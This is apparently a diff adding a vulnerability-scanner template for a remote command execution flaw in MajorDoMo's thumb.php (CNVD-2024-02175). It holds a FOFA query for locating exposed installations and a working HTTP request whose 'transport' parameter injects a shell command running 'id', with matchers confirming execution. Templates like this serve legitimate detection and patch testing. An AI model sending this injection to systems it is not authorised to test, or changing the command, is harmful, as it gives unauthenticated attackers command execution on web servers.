@@ -1,0 +1,32 @@
+id: MajorDoMo-thumb_php-rce-CNVD-2024-02175
+
+info:
+  name: "MajorDoMo thumb.php 远程命令执行漏洞（CNVD-2024-02175）"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="MajordomoSL"
+    该接口未实施身份验证机制，允许远程攻击者通过构造恶意请求在目标服务器上执行任意系统命令，导致潜在的后门植入及完全控制Web服务器的风险。攻击载荷可通过命令注入方式绕过安全限制，实现对底层操作系统的非授权访问。
+  reference:
+  - https://mp.weixin.qq.com/s/n0X5H64UOIm21XTRbko15w
+  tags: MajordomoSL
+
+
+http:
+- raw:
+  - |
+    GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'uid='
+    - 'gid='
+    condition: and
+  - type: status
+    status:
+    - 200
